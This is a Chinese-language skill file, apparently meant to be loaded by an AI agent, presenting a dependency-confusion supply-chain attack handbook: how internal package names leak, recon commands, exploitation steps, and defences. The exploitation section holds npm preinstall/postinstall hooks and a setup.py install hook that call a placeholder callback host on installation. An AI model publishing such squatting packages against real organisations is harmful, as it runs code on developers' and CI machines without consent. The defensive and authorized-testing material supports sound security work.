# 技能：依赖混淆——供应链攻击手册

> **AI 加载指令**：专家级依赖混淆方法。涵盖私有包名泄露、公共注册表如何胜出版本解析、特定生态系统的陷阱（npm 范围、pip 额外索引、Maven 仓库顺序）、侦察命令、非破坏性 PoC 模式（回调、不数据外泄），以及防御控制。在清单或 CI 缓存处于范围内的场景下，与供应链侦察工作流配合使用。**仅在您有权测试的系统上使用。**

## 0. 快速入门

**首先查找什么**

- **清单**中列出了看似**内部**的包名（短无范围名称、组织特定令牌、产品代码名称），但没有**硬私有注册表锁定**。
- 证据表明，**相同名称**可能存在于**公共**注册表中，或者可以**被占用**，且其**语义版本**高于私有源发布的版本。
- **锁文件**缺失、陈旧或 CI 中未强制执行，导致 `install`/`build` 可能为公共元数据漂移。

**快速心智模型**：*如果解析器可以看到私有和公共索引，并且版本范围允许，那么“最新”的匹配版本可能是攻击者的。*

路由说明：如果任务来自供应链、注册表暴露或 CI 构建侦察，首先使用 `recon-for-sec` 列出内部包名和可能的公共注册表冲突。

---

## 1. 核心概念

1. **私有包**：组织仅在内部注册表上发布库（或在暗示“我们”的约定下），例如一个范围名称如 `@org-scope/internal-utils` 或一个**无范围**名称如 `acme-billing-sdk`。
2. **攻击者占用名称**：相同的包名在**公共**注册表（npmjs、PyPI、RubyGems 等）上发布。
3. **解析器偏好**：许多设置跨**所有配置的索引**解析**最高匹配版本**（或合并元数据），因此如果范围允许，公共 `9.9.9` 可以胜过私有 `1.2.3`。
4. **执行**：包管理器运行**生命周期脚本**（npm `preinstall`/`postinstall`、setuptools 入口点等）→ **攻击者代码在**开发者笔记本电脑、CI 或生产镜像构建上运行。

这是一个**供应链**类问题：影响通常**广泛**（许多消费者）且**静默**，直到构建或运行时挂钩触发。

---

## 2. 受影响的生态系统

| 生态系统 | 典型清单 | 混淆角度 |
|---------|---------|---------|
| **npm** | `package.json` | **范围**包 (`@scope/pkg`) 在注册表上拥有范围时**更安全**；**无范围**的私有样式名称是**高风险**。多个注册表 / `.npmrc` `registry` 与每个范围 `@scope:registry=` 配置错误会增加风险。 |
| **pip** | `requirements.txt`、`pyproject.toml`、`setup.py` | `pip install -i` / **`--extra-index-url`** 合并索引；公共索引可以为相同分布名称提供**更高版本**。 |
| **RubyGems** | `Gemfile` | **`source`** 顺序和附加源；从 rubygems.org 可达的模糊 gem 名称。 |
| **Maven** | `pom.xml` | **仓库**声明**顺序**和**镜像**设置；如果策略允许，发布相同 `groupId:artifactId` 的公共仓库在更高版本上可以胜出。 |
| **Composer** | `composer.json` | **Packagist** 是默认值；没有 `repositories`/`canonical` 纪律的私有包可能与公共名称冲突。 |
| **Docker** | `FROM`、镜像标签 | 容器注册表（例如公共 hub）上的**拼写窃取**，用于与内部基础镜像名称相似的镜像。 |

---

## 3. 侦察

**内部名称泄露的位置**

- 仓库或分支中提交的 **`package.json`**、**`requirements.txt`**、**`Gemfile`**、**`pom.xml`**、**`composer.json`**。
- **JavaScript 源映射**、捆绑资产或**错误堆栈跟踪**引用包路径。
- **`.npmrc`**、**`.pypirc`**、CI 日志显示安装 URL 或镜像端点。
- **问题追踪器**、**gist 段落**和来自 SBOM 导出的**依赖关系图**。

**检查公共占用/可声明性（只读）**

```bash
# npm — 名称的元数据（无范围）
npm view some-internal-package-name version

# npm — 范围（需要范围存在/可读）
npm view @some-scope/internal-lib versions --json

# PyPI — 干运行样式版本探测（调整名称；如果未找到则失败）
python3 -m pip install --dry-run 'some-internal-package-name==99.99.99'

# RubyGems — 远程查询
gem search '^some-internal-package-name$' --remote

# Maven Central — 搜索坐标（示例模式）
# curl "https://search.maven.org/solrsearch/select?q=g:com.example+AND+a:internal-lib&rows=1&wt=json"
```

路由说明：包名枚举后，仅在授权环境中考虑 PoC；公共注册表查询本身通常是被动侦察。

---

## 4. 利用

**授权测试模式**

1. **注册**（或使用受控命名空间）在目标解析器可以访问的公共注册表上**相同包名**。
2. 发布**更高语义版本**，该版本在受害者声明的范围内高于合法内部线（例如 `^1.0.0` → 发布 `9.9.9`）。
3. 添加**生命周期挂钩**以证明执行而不损害主机——优先使用**DNS/HTTP 回调**到您控制的协作者，**不进行破坏性写入**。

**npm `package.json` — 最小回调样式 PoC（说明性）**

```json
{
  "name": "some-internal-package-name",
  "version": "9.9.9",
  "description": "仅授权依赖混淆 PoC",
  "scripts": {
    "preinstall": "node -e \"require('https').get('https://YOUR_CALLBACK_HOST/poc?t='+process.env.npm_package_name)\""
  }
}
```

**npm `package.json` — Shell + curl 回退（说明性）**

```json
{
  "scripts": {
    "postinstall": "curl -fsS 'https://YOUR_CALLBACK_HOST/npm-postinstall' || true"
  }
}
```

**pip — 设置挂钩模式（说明性；仅在授权的实验室包中使用）**

```python
# setup.py (节选)
from setuptools import setup
from setuptools.command.install import install

class PoCInstall(install):
    def run(self):
        import urllib.request
        urllib.request.urlopen("https://YOUR_CALLBACK_HOST/pip-install")
        install.run(self)

setup(
    name="some-internal-package-name",
    version="9.9.9",
    cmdclass={"install": PoCInstall},
)
```

**参考实现（研究/实验室）**：社区 PoC 布局和工作流类似于 [`0xsapra/dependency-confusion-exploit`](https://github.com/0xsapra/dependency-confusion-exploit) —— 仅在您有写入权限的地方自动版本提升、发布和回调确认。

---

## 5. 工具

| 工具 | 角色 |
|------|------|
| [**visma-prodsec/confused**](https://github.com/visma-prodsec/confused) | 扫描清单文件中可能**可占用**在公共注册表上的依赖名称（多生态系统）。 |
| [**synacktiv/DepFuzzer**](https://github.com/synacktiv/DepFuzzer) | 自动化**依赖混淆**测试工作流（严格在范围内使用）。 |

仅针对**您的**清单或**授权**参与运行；不要用于为无关第三方占用名称。

---

## 6. 防御

- **npm**：优先使用**范围**包 (`@org-scope/pkg`)，范围由组织拥有；设置**`.npmrc`**使私有范围映射到私有注册表，**默认 `registry`** 不会意外为内部名称设置为公共。
- **固定版本**：**确切版本** + **锁文件** (`package-lock.json`、`poetry.lock`、`Gemfile.lock`、`composer.lock`) 在 CI 中强制执行。
- **pip**：避免粗心的**`--extra-index-url`**；优先使用**单个私有索引**与**镜像**，或 CI 中的**显式 `--index-url`** 策略。
- **Maven / Gradle**：控制**仓库顺序**，使用**内部镜像**，并在发布管道上**阻止**意外 groupIds。
- **Composer**：使用**`repositories`**与**`canonical: true`**为私有包；验证 Packagist 是否引入了意外的供应商。
- **防御性注册**：在政策允许的情况下，在公共注册表上**保留**内部名称（占用您自己的名称）。
- **监控**：如 **Socket.dev**、**Snyk** 或类似 SBOM/供应链扫描器，以在关键包出现**新发布者**或**版本跳跃**时发出警报。

---

## 7. 决策树

```text
清单是否引用可能全球非唯一的包名？
├─ 否 → 仅凭命名不太可能发生依赖混淆；转向拼写窃取/受感染的账户。
└─ 是
    ├─ 私有注册表是否是该名称的唯一来源（范围 + .npmrc / 单一索引 / 镜像）？
    │   ├─ 是 → 较低风险；仍需验证 CI 和开发者机器不会覆盖配置。
    │   └─ 否 → 高风险
    │         ├─ 公共注册表是否可以在声明范围内发布更高版本？
    │         │   ├─ 是 → 在授权测试中视为可利用；用回调 PoC 证明。
    │         │   └─ 否 → 检查预发布标签、本地 `file:` 依赖和陈旧锁文件。
    │         └─ 生命周期脚本在 CI 中是否禁用/阻止？（减少影响，但不会消除占用风险）
```

---

## 相关路由

- **从 `recon-for-sec`**：在执行**供应链侦察**时，将泄露的清单和内部包标识符与**第 3 节**中的检查和**第 7 节**中的决策树交叉链接，然后再提出任何发布/PoC 步骤。
